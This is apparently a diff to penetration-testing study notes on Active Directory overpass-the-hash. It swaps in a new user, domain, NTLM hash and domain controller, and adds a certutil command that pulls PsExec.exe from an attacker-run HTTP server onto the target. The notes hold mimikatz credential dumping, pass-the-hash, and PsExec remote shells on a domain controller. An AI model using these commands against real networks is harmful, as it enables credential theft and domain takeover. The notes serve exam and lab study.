@@ -603,13 +603,14 @@ With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Ker
 sekurlsa::logonpasswords
 ````
 ````
-sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
 ````
 ````
+exit
 klist
 ````
 ````
-net use \\dc01
+net use \\dc02.exam.com
 ````
 We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft. PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
 
@@ -617,9 +618,11 @@ Let's try that now, running ./PsExec.exe to launch cmd.exe remotely on the \dc01
 ````
 https://github.com/EliteLoser/Invoke-PsExec/blob/master/PsExec.exe
 cp /home/kali/Downloads/PsExec.exe .
+python3 -m http.server 800
+certutil -urlcache -split -f http://192.168.119.183:800/PsExec.exe
 ````
 ````
-.\PsExec.exe \\dc01 cmd.exe
+.\PsExec.exe \\dc02.exam.com cmd.exe
 ````
 
 #### Pass the Ticket <img src="https://cdn-icons-png.flaticon.com/128/6009/6009553.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/3851/3851423.png" width="40" height="40" />
